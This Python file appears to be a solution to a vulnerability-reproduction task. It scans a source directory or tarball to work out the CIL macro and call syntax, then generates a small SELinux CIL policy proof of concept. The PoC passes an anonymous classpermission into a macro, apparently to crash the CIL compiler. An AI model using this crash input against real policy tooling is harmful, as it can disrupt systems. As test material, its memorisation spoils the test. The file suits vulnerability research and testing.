import os
import re
import tarfile
from typing import Any, Iterator, List, Optional, Tuple, Union


SExpr = Union[str, List["SExpr"]]


def _strip_comments(s: str) -> str:
    out_lines = []
    for line in s.splitlines():
        # Common comment styles seen in policy languages
        for c in (";", "#"):
            idx = line.find(c)
            if idx != -1:
                line = line[:idx]
        out_lines.append(line)
    return "\n".join(out_lines)


def _tokenize_sexpr(s: str, start: int = 0) -> Iterator[Tuple[str, int]]:
    i = start
    n = len(s)
    while i < n:
        ch = s[i]
        if ch.isspace():
            i += 1
            continue
        if ch == "(" or ch == ")":
            yield (ch, i)
            i += 1
            continue
        if ch == '"':
            j = i + 1
            esc = False
            while j < n:
                c = s[j]
                if esc:
                    esc = False
                    j += 1
                    continue
                if c == "\\":
                    esc = True
                    j += 1
                    continue
                if c == '"':
                    j += 1
                    break
                j += 1
            yield (s[i:j], i)
            i = j
            continue
        j = i
        while j < n and (not s[j].isspace()) and s[j] not in "()":
            j += 1
        yield (s[i:j], i)
        i = j


def _parse_first_sexpr(s: str, start: int) -> Optional[SExpr]:
    s = _strip_comments(s)
    idx = s.find("(", start)
    if idx == -1:
        return None
    tokens = list(_tokenize_sexpr(s, idx))
    if not tokens or tokens[0][0] != "(":
        return None

    stack: List[List[SExpr]] = []
    cur: Optional[List[SExpr]] = None
    started = False

    for tok, _pos in tokens:
        if tok == "(":
            started = True
            new_list: List[SExpr] = []
            if cur is not None:
                cur.append(new_list)
                stack.append(cur)
            cur = new_list
            continue
        if tok == ")":
            if cur is None:
                return None
            if not stack:
                return cur
            cur = stack.pop()
            continue
        if not started:
            continue
        if cur is None:
            return None
        cur.append(tok)
    return None


def _iter_text_files_from_dir(root: str) -> Iterator[str]:
    for dirpath, _dirnames, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 3_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    b = f.read()
                if b"\x00" in b:
                    continue
                yield b.decode("utf-8", "ignore")
            except Exception:
                continue


def _iter_text_files_from_tar(tar_path: str) -> Iterator[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                if m.size <= 0 or m.size > 3_000_000:
                    continue
                name = m.name.lower()
                if any(x in name for x in (".o", ".a", ".so", ".bin", ".png", ".jpg", ".gif", ".pdf", ".zip")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                except Exception:
                    continue
                if b"\x00" in b:
                    continue
                try:
                    yield b.decode("utf-8", "ignore")
                except Exception:
                    continue
    except Exception:
        return


def _detect_macro_and_call_style(src_path: str) -> Tuple[bool, bool]:
    """
    Returns:
        (typed_params, call_has_arglist)
    """
    texts: Iterator[str]
    if os.path.isdir(src_path):
        texts = _iter_text_files_from_dir(src_path)
    elif os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
        texts = _iter_text_files_from_tar(src_path)
    else:
        return (True, True)

    typed_params: Optional[bool] = None
    call_has_arglist: Optional[bool] = None

    for t in texts:
        if typed_params is None and "(macro" in t:
            mpos = t.find("(macro")
            sexpr = _parse_first_sexpr(t, mpos)
            if isinstance(sexpr, list) and len(sexpr) >= 3 and sexpr and sexpr[0] == "macro":
                params = sexpr[2]
                if isinstance(params, list):
                    typed_params = any(isinstance(x, list) for x in params)
                else:
                    typed_params = False

        if call_has_arglist is None and "(call" in t:
            cpos = t.find("(call")
            sexpr = _parse_first_sexpr(t, cpos)
            if isinstance(sexpr, list) and len(sexpr) >= 3 and sexpr and sexpr[0] == "call":
                # Common CIL style: (call name (arg1 arg2 ...))
                # Alternative: (call name arg1 arg2 ...)
                call_has_arglist = (len(sexpr) == 3 and isinstance(sexpr[2], list))

        if typed_params is not None and call_has_arglist is not None:
            break

    return (True if typed_params is None else typed_params, True if call_has_arglist is None else call_has_arglist)


class Solution:
    def solve(self, src_path: str) -> bytes:
        typed_params, call_has_arglist = _detect_macro_and_call_style(src_path)

        if typed_params:
            macro_params = "((classpermission cp))"
        else:
            macro_params = "(cp)"

        if call_has_arglist:
            call_stmt = "(call m ((classpermission (file (read)))))"
        else:
            call_stmt = "(call m (classpermission (file (read))))"

        poc = "\n".join(
            [
                "(class file (read))",
                f"(macro m {macro_params}",
                "    (classpermissionset cps (cp))",
                ")",
                call_stmt,
                "",
            ]
        )
        return poc.encode("utf-8")